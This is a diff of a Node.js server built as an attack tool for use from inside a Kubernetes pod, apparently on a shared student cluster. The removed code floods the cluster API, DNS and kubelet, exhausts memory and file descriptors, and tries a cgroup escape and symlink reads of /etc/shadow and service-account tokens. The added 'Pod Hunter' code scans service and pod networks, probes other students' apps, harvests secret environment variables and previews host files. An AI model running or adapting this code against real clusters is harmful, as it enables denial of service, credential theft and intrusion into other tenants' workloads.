@@ -1,377 +1,11 @@
 const http = require("http");
-const https = require("https");
+const net = require("net");
 const os = require("os");
 const fs = require("fs");
-const net = require("net");
 const dns = require("dns");
-const dgram = require("dgram");
-const { execSync, spawn } = require("child_process");
-const crypto = require("crypto");
 
 let results = {};
 
-// 1. BANDWIDTH EXHAUSTION - Flood network with data
-async function bandwidthExhaust() {
-  results.bandwidthExhaust = { sent: 0, connections: [] };
-  
-  const targets = [
-    { host: "10.100.0.1", port: 443, name: "K8s API" },
-    { host: "10.100.0.10", port: 53, name: "CoreDNS" },
-    { host: "192.168.66.176", port: 10250, name: "Kubelet" }
-  ];
-  
-  const payload = crypto.randomBytes(65536); // 64KB chunks
-  
-  for (const target of targets) {
-    let bytesSent = 0;
-    const sockets = [];
-    
-    try {
-      // Open 50 connections and flood
-      for (let i = 0; i < 50; i++) {
-        const socket = new net.Socket();
-        socket.setTimeout(5000);
-        
-        await new Promise((resolve) => {
-          socket.on("connect", () => {
-            sockets.push(socket);
-            // Send data repeatedly
-            for (let j = 0; j < 10; j++) {
-              try {
-                socket.write(payload);
-                bytesSent += payload.length;
-              } catch(e) {}
-            }
-            resolve();
-          });
-          socket.on("error", () => resolve());
-          socket.on("timeout", () => resolve());
-          socket.connect(target.port, target.host);
-        });
-      }
-      
-      results.bandwidthExhaust.connections.push({
-        target: target.name,
-        sockets: sockets.length,
-        bytesSent: bytesSent
-      });
-      
-      // Cleanup
-      sockets.forEach(s => s.destroy());
-    } catch(e) {
-      results.bandwidthExhaust.connections.push({ target: target.name, error: e.message });
-    }
-  }
-  
-  results.bandwidthExhaust.totalSent = results.bandwidthExhaust.connections.reduce((a, c) => a + (c.bytesSent || 0), 0);
-}
-
-// 2. FILE DESCRIPTOR EXHAUSTION
-async function fdExhaust() {
-  results.fdExhaust = { opened: 0, sockets: 0, files: 0 };
-  
-  const handles = [];
-  
-  // Open many files
-  try {
-    for (let i = 0; i < 10000; i++) {
-      const fd = fs.openSync("/dev/null", "r");
-      handles.push({ type: "file", fd });
-      results.fdExhaust.files++;
-    }
-  } catch(e) {
-    results.fdExhaust.fileError = e.message;
-  }
-  
-  // Open many sockets
-  try {
-    for (let i = 0; i < 5000; i++) {
-      const socket = new net.Socket();
-      handles.push({ type: "socket", socket });
-      results.fdExhaust.sockets++;
-    }
-  } catch(e) {
-    results.fdExhaust.socketError = e.message;
-  }
-  
-  results.fdExhaust.opened = handles.length;
-  
-  // Cleanup
-  handles.forEach(h => {
-    try {
-      if (h.type === "file") fs.closeSync(h.fd);
-      else h.socket.destroy();
-    } catch(e) {}
-  });
-}
-
-// 3. DNS FLOOD - Exhaust DNS resolver
-async function dnsFlood() {
-  results.dnsFlood = { queries: 0, successes: 0, failures: 0 };
-  
-  const randomDomains = [];
-  for (let i = 0; i < 1000; i++) {
-    randomDomains.push(`${crypto.randomBytes(16).toString("hex")}.example.com`);
-  }
-  
-  const promises = randomDomains.map(domain => {
-    return new Promise((resolve) => {
-      dns.resolve4(domain, (err) => {
-        results.dnsFlood.queries++;
-        if (err) results.dnsFlood.failures++;
-        else results.dnsFlood.successes++;
-        resolve();
-      });
-    });
-  });
-  
-  await Promise.all(promises);
-}
-
-// 4. PROC FILESYSTEM ABUSE - Try to read other processes
-async function procAbuse() {
-  results.procAbuse = { processes: [], environments: [], secrets: [] };
-  
-  // Scan /proc for other processes
-  try {
-    const procs = fs.readdirSync("/proc").filter(p => /^\d+$/.test(p));
-    results.procAbuse.totalProcesses = procs.length;
-    
-    for (const pid of procs.slice(0, 50)) {
-      try {
-        const cmdline = fs.readFileSync(`/proc/${pid}/cmdline`, "utf8").replace(/\0/g, " ").trim();
-        const status = fs.readFileSync(`/proc/${pid}/status`, "utf8");
-        const name = status.match(/Name:\s+(\S+)/)?.[1] || "unknown";
-        
-        results.procAbuse.processes.push({ pid, name, cmdline: cmdline.substring(0, 100) });
-        
-        // Try to read environment (usually blocked)
-        try {
-          const environ = fs.readFileSync(`/proc/${pid}/environ`, "utf8");
-          if (environ.includes("SECRET") || environ.includes("PASSWORD") || environ.includes("KEY")) {
-            results.procAbuse.secrets.push({ pid, hint: "Contains sensitive env vars" });
-          }
-          results.procAbuse.environments.push({ pid, length: environ.length });
-        } catch(e) {}
-        
-      } catch(e) {}
-    }
-  } catch(e) {
-    results.procAbuse.error = e.message;
-  }
-}
-
-// 5. CGROUP ESCAPE ATTEMPT
-async function cgroupEscape() {
-  results.cgroupEscape = {};
-  
-  // Read cgroup info
-  try {
-    results.cgroupEscape.cgroups = fs.readFileSync("/proc/self/cgroup", "utf8");
-  } catch(e) {}
-  
-  // Try to write to cgroup
-  const cgroupPaths = [
-    "/sys/fs/cgroup/memory/memory.limit_in_bytes",
-    "/sys/fs/cgroup/cpu/cpu.cfs_quota_us",
-    "/sys/fs/cgroup/pids/pids.max"
-  ];
-  
-  for (const path of cgroupPaths) {
-    try {
-      // Try to read
-      const value = fs.readFileSync(path, "utf8").trim();
-      results.cgroupEscape[path] = { readable: true, value };
-      
-      // Try to write (will fail but test)
-      try {
-        fs.writeFileSync(path, "999999999");
-        results.cgroupEscape[path].writable = true;
-      } catch(e) {
-        results.cgroupEscape[path].writable = false;
-      }
-    } catch(e) {
-      results.cgroupEscape[path] = { readable: false, error: e.code };
-    }
-  }
-  
-  // Try notify_on_release escape
-  try {
-    const releasePath = "/sys/fs/cgroup/memory/notify_on_release";
-    fs.writeFileSync(releasePath, "1");
-    results.cgroupEscape.notifyOnRelease = "writable - VULNERABLE";
-  } catch(e) {
-    results.cgroupEscape.notifyOnRelease = "blocked";
-  }
-}
-
-// 6. ATTACK OTHER PODS - Scan and probe other student apps
-async function attackOtherPods() {
-  results.otherPods = { discovered: [], attacked: [] };
-  
-  const myIP = Object.values(os.networkInterfaces())
-    .flat()
-    .find(i => i.family === "IPv4" && !i.internal)?.address;
-  
-  const baseIP = myIP ? myIP.split(".").slice(0, 2).join(".") : "192.168";
-  
-  // Scan pod network for other apps
-  for (let subnet = 0; subnet <= 128; subnet += 16) {
-    for (let host = 1; host <= 30; host++) {
-      const ip = `${baseIP}.${subnet}.${host}`;
-      if (ip === myIP) continue;
-      
-      try {
-        const open = await scanPort(ip, 3000, 50);
-        if (open) {
-          results.otherPods.discovered.push(ip);
-          
-          // Try to attack discovered pod
-          try {
-            const resp = await httpGet(`http://${ip}:3000/`, 2000);
-            results.otherPods.attacked.push({
-              ip,
-              status: resp.status,
-              body: resp.body?.substring(0, 200)
-            });
-          } catch(e) {}
-        }
-      } catch(e) {}
-    }
-  }
-}
-
-// 7. SYMLINK ATTACK - Try to escape via symlinks
-async function symlinkAttack() {
-  results.symlinkAttack = {};
-  
-  const targets = [
-    "/etc/shadow",
-    "/etc/kubernetes/admin.conf",
-    "/root/.kube/config",
-    "/var/run/secrets/kubernetes.io/serviceaccount/token"
-  ];
-  
-  for (const target of targets) {
-    const linkPath = `/tmp/symlink_${Date.now()}_${Math.random().toString(36).slice(2)}`;
-    try {
-      fs.symlinkSync(target, linkPath);
-      
-      try {
-        const content = fs.readFileSync(linkPath, "utf8");
-        results.symlinkAttack[target] = { 
-          success: true, 
-          content: content.substring(0, 100) 
-        };
-      } catch(e) {
-        results.symlinkAttack[target] = { symlinked: true, readError: e.code };
-      }
-      
-      fs.unlinkSync(linkPath);
-    } catch(e) {
-      results.symlinkAttack[target] = { error: e.code };
-    }
-  }
-}
-
-// 8. NODE FILESYSTEM ACCESS via /proc/1/root
-async function nodeFilesystemAccess() {
-  results.nodeFS = { accessible: [], secrets: [] };
-  
-  const hostPaths = [
-    "/proc/1/root/etc/passwd",
-    "/proc/1/root/etc/shadow",
-    "/proc/1/root/etc/kubernetes",
-    "/proc/1/root/var/lib/kubelet/config.yaml",
-    "/proc/1/root/root/.aws/credentials",
-    "/proc/1/root/home"
-  ];
-  
-  for (const path of hostPaths) {
-    try {
-      const stat = fs.statSync(path);
-      results.nodeFS.accessible.push({ path, type: stat.isDirectory() ? "dir" : "file" });
-      
-      if (stat.isFile()) {
-        try {
-          const content = fs.readFileSync(path, "utf8");
-          if (content.includes("password") || content.includes("secret") || content.includes("key")) {
-            results.nodeFS.secrets.push({ path, hint: "Contains sensitive data" });
-          }
-        } catch(e) {}
-      }
-      
-      if (stat.isDirectory()) {
-        try {
-          const files = fs.readdirSync(path).slice(0, 20);
-          results.nodeFS.accessible[results.nodeFS.accessible.length - 1].contents = files;
-        } catch(e) {}
-      }
-    } catch(e) {
-      // Not accessible
-    }
-  }
-}
-
-// 9. UDP FLOOD
-async function udpFlood() {
-  results.udpFlood = { sent: 0 };
-  
-  const client = dgram.createSocket("udp4");
-  const payload = crypto.randomBytes(1024);
-  
-  const targets = [
-    { host: "10.100.0.10", port: 53 },  // CoreDNS
-    { host: "10.100.0.1", port: 443 }    // K8s API
-  ];
-  
-  try {
-    for (const target of targets) {
-      for (let i = 0; i < 1000; i++) {
-        client.send(payload, target.port, target.host);
-        results.udpFlood.sent++;
-      }
-    }
-  } catch(e) {
-    results.udpFlood.error = e.message;
-  }
-  
-  client.close();
-}
-
-// 10. EXTREME MEMORY BOMB - Try to trigger OOM killer on node
-async function extremeMemoryBomb() {
-  results.memoryBomb = { allocations: [] };
-  const chunks = [];
-  let allocated = 0;
-  
-  try {
-    while (true) {
-      const chunk = Buffer.alloc(500 * 1024 * 1024); // 500MB
-      chunk.fill(crypto.randomBytes(1)[0]);
-      chunks.push(chunk);
-      allocated += 500;
-      
-      results.memoryBomb.allocations.push({
-        mb: allocated,
-        freeMem: os.freemem(),
-        pct: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
-      });
-      
-      // Will eventually OOM
-      if (os.freemem() < 50 * 1024 * 1024) {
-        results.memoryBomb.stoppedAt = allocated + "MB";
-        break;
-      }
-    }
-  } catch(e) {
-    results.memoryBomb.crashed = true;
-    results.memoryBomb.error = e.message;
-    results.memoryBomb.totalAllocated = allocated + "MB";
-  }
-}
-
-// Helper functions
 async function scanPort(host, port, timeout = 100) {
   return new Promise((resolve) => {
     const socket = new net.Socket();
@@ -383,63 +17,211 @@ async function scanPort(host, port, timeout = 100) {
   });
 }
 
-async function httpGet(url, timeout = 2000) {
-  return new Promise((resolve, reject) => {
-    const proto = url.startsWith("https") ? https : http;
-    const req = proto.get(url, { timeout, rejectUnauthorized: false }, (res) => {
+async function httpProbe(url, timeout = 2000) {
+  return new Promise((resolve) => {
+    const req = http.get(url, { timeout }, (res) => {
       let body = "";
       res.on("data", c => body += c);
-      res.on("end", () => resolve({ status: res.statusCode, body }));
+      res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 500) }));
     });
-    req.on("error", reject);
-    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
+    req.on("error", () => resolve(null));
+    req.on("timeout", () => { req.destroy(); resolve(null); });
   });
 }
 
-// Server
+// Discover K8s services via DNS
+async function discoverServices() {
+  results.services = [];
+  
+  const svcPatterns = [
+    "kuros-api", "kuros-backend", "kuros-frontend", "kuros-db",
+    "postgres", "postgresql", "mysql", "redis", "mongodb", "mongo",
+    "api", "backend", "frontend", "web", "app", "nginx", "ingress"
+  ];
+  
+  const namespaces = ["default", "kube-system", "kuros", "student", "production"];
+  
+  for (const ns of namespaces) {
+    for (const svc of svcPatterns) {
+      const fqdn = `${svc}.${ns}.svc.cluster.local`;
+      try {
+        const addrs = await new Promise((r, j) => {
+          dns.resolve4(fqdn, (e, a) => e ? j(e) : r(a));
+        });
+        results.services.push({ name: fqdn, ips: addrs });
+      } catch(e) {}
+    }
+  }
+}
+
+// Scan K8s service CIDR for live services
+async function scanServiceCIDR() {
+  results.serviceScan = [];
+  const ports = [80, 443, 3000, 5432, 6379, 8080, 9090, 27017];
+  
+  // Scan 10.100.x.x
+  for (let i = 0; i <= 255; i += 8) {
+    for (let j = 1; j <= 255; j += 16) {
+      const ip = `10.100.${i}.${j}`;
+      for (const port of [80, 443]) {
+        const open = await scanPort(ip, port, 50);
+        if (open) {
+          results.serviceScan.push({ ip, port });
+          
+          // Probe HTTP
+          const resp = await httpProbe(`http://${ip}:${port}/`, 1000);
+          if (resp) {
+            results.serviceScan[results.serviceScan.length - 1].http = resp;
+          }
+        }
+      }
+    }
+  }
+}
+
+// Scan pod CIDR for other student pods
+async function scanPodCIDR() {
+  results.podScan = { myIP: "", otherPods: [] };
+  
+  const myIP = Object.values(os.networkInterfaces())
+    .flat()
+    .find(i => i.family === "IPv4" && !i.internal)?.address;
+  
+  results.podScan.myIP = myIP;
+  
+  if (!myIP) return;
+  
+  const parts = myIP.split(".");
+  const base = parts.slice(0, 2).join(".");
+  
+  // Scan nearby subnets for pods on port 3000 (Node.js default)
+  for (let subnet = 0; subnet <= 128; subnet += 8) {
+    for (let host = 1; host <= 254; host += 2) {
+      const ip = `${base}.${subnet}.${host}`;
+      if (ip === myIP) continue;
+      
+      const open = await scanPort(ip, 3000, 30);
+      if (open) {
+        const info = { ip };
+        
+        // Try to access their app
+        const resp = await httpProbe(`http://${ip}:3000/`, 1000);
+        if (resp) {
+          info.response = resp;
+        }
+        
+        results.podScan.otherPods.push(info);
+      }
+    }
+  }
+}
+
+// Read environment from /proc/1/environ
+async function readEnvironment() {
+  results.environment = {};
+  
+  try {
+    const environ = fs.readFileSync("/proc/1/environ", "utf8");
+    const vars = environ.split("\0").filter(v => v);
+    results.environment.count = vars.length;
+    results.environment.interesting = vars.filter(v => 
+      v.includes("SECRET") || v.includes("PASSWORD") || 
+      v.includes("KEY") || v.includes("TOKEN") ||
+      v.includes("DATABASE") || v.includes("MONGO") ||
+      v.includes("REDIS") || v.includes("AWS")
+    );
+  } catch(e) {
+    results.environment.error = e.message;
+  }
+}
+
+// Check for interesting files in /proc/1/root
+async function exploreHostFS() {
+  results.hostFS = { files: [], secrets: [] };
+  
+  const paths = [
+    "/proc/1/root/etc/passwd",
+    "/proc/1/root/etc/shadow",
+    "/proc/1/root/etc/kubernetes",
+    "/proc/1/root/var/lib/kubelet",
+    "/proc/1/root/root",
+    "/proc/1/root/home",
+    "/proc/1/root/etc/docker",
+    "/proc/1/root/var/run/secrets"
+  ];
+  
+  for (const p of paths) {
+    try {
+      const stat = fs.statSync(p);
+      const info = { path: p, type: stat.isDirectory() ? "dir" : "file" };
+      
+      if (stat.isDirectory()) {
+        try {
+          info.contents = fs.readdirSync(p).slice(0, 30);
+        } catch(e) {}
+      } else if (stat.isFile() && stat.size < 10000) {
+        try {
+          const content = fs.readFileSync(p, "utf8");
+          info.preview = content.substring(0, 500);
+          if (content.match(/password|secret|key|token|credential/i)) {
+            results.hostFS.secrets.push(p);
+          }
+        } catch(e) {}
+      }
+      
+      results.hostFS.files.push(info);
+    } catch(e) {}
+  }
+}
+
+// File descriptor exhaustion
+async function fdExhaust() {
+  results.fdExhaust = { opened: 0 };
+  const handles = [];
+  
+  try {
+    while (handles.length < 50000) {
+      handles.push(fs.openSync("/dev/null", "r"));
+      results.fdExhaust.opened++;
+    }
+  } catch(e) {
+    results.fdExhaust.maxReached = handles.length;
+    results.fdExhaust.error = e.message;
+  }
+  
+  // Cleanup
+  handles.forEach(fd => { try { fs.closeSync(fd); } catch(e) {} });
+}
+
 const server = http.createServer(async (req, res) => {
   results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
   
   try {
-    if (req.url === "/extreme") {
-      await bandwidthExhaust();
+    if (req.url === "/hunt") {
+      await discoverServices();
+      await scanServiceCIDR();
+      await scanPodCIDR();
+      await readEnvironment();
+      await exploreHostFS();
       await fdExhaust();
-      await dnsFlood();
-      await procAbuse();
-      await cgroupEscape();
-      await symlinkAttack();
-      await nodeFilesystemAccess();
-      await udpFlood();
-      await attackOtherPods();
-      
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify(results, null, 2));
-    } else if (req.url === "/oom-extreme") {
-      await extremeMemoryBomb();
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify(results, null, 2));
-    } else if (req.url === "/bandwidth") {
-      await bandwidthExhaust();
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify(results, null, 2));
+    } else if (req.url === "/services") {
+      await discoverServices();
+      await scanServiceCIDR();
     } else if (req.url === "/pods") {
-      await attackOtherPods();
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify(results, null, 2));
-    } else if (req.url === "/proc") {
-      await procAbuse();
-      await nodeFilesystemAccess();
-      res.writeHead(200, { "Content-Type": "application/json" });
-      res.end(JSON.stringify(results, null, 2));
-    } else {
-      res.writeHead(200);
-      res.end("EXTREME Attack - /extreme, /oom-extreme, /bandwidth, /pods, /proc");
+      await scanPodCIDR();
+    } else if (req.url === "/hostfs") {
+      await exploreHostFS();
+    } else if (req.url === "/env") {
+      await readEnvironment();
     }
+    
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify(results, null, 2));
   } catch(e) {
     res.writeHead(500);
-    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
+    res.end(JSON.stringify({ error: e.message }));
   }
 });
 
 server.listen(process.env.PORT || 3000);
-console.log("EXTREME Attack server on port " + (process.env.PORT || 3000));
+console.log("Pod Hunter on port " + (process.env.PORT || 3000));
